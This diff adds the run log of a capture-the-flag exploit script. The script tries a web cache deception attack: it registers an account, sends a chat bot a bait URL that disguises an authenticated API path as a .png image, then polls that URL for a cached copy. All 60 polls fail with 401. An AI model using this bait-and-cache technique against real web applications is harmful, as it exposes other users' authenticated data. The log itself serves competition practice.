@@ -1,0 +1,70 @@
+/Users/airp0wer/Projects/alfa-ctf-2026/tasks-2026/noonechilled/solve/exploit.py:11: SyntaxWarning: "\s" is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\s"? A raw string is also an option.
+  - boss-bot's url-detector regex (`https?://[^\s]+`) AND its image-extension
+[-] Did not see cached response. Bot may be down.
+[register] 200 {"message":"Регистрация успешна","user":{"id":"6b50f8fc-f0ef-4c44-8688-9b5aecb4461b","email":"pwn-7kujuh2jrc@example.com","display_name":"pwner-m8ps5r","role":"employee"}}
+[register] OK as pwn-7kujuh2jrc@example.com (id=6b50f8fc-f0ef-4c44-8688-9b5aecb4461b)
+[ensure-boss-dm] 200 {"kind":"dm","title":"Чат с The Boss","id":"203638bc-688a-487b-a541-a48dfaa55133","created_by":"6b50f8fc-f0ef-4c44-8688-9b5aecb4461b","created_at":"2026-04-28T12:08:19.040533","is_active":true,"unread
+[+] DM room id: 203638bc-688a-487b-a541-a48dfaa55133
+[+] Bait URL: https://noonechilled-3wbd3hhx.alfactf.ru/xhr/api/auth/vacation-approval/cf6e5e3a86bd461d87d23c53ef883291.png
+[send_bait] 200 body='Привет, босс! Можно отпуск? Вот мем для контекста: https://noonechilled-3wbd3hhx.alfactf.ru/xhr/api/auth/vacation-approval/cf6e5e3a86bd461d87d23c53ef883291.png'
+[+] Bait sent. Polling unauth GET on the bait URL until cache populates...
+[poll 1/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 2/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 3/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 4/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 5/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 6/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 7/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 8/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 9/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 10/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 11/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 12/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 13/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 14/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 15/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 16/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 17/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 18/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 19/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 20/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 21/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 22/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 23/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 24/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 25/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 26/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 27/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 28/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 29/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 30/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 31/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 32/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 33/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 34/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 35/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 36/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 37/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 38/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 39/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 40/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 41/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 42/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 43/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 44/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 45/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 46/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 47/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 48/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 49/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 50/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 51/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 52/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 53/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 54/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 55/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 56/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 57/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 58/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 59/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
+[poll 60/60] 401 cache=MISS ct=application/json body={"detail":"Could not validate credentials"}
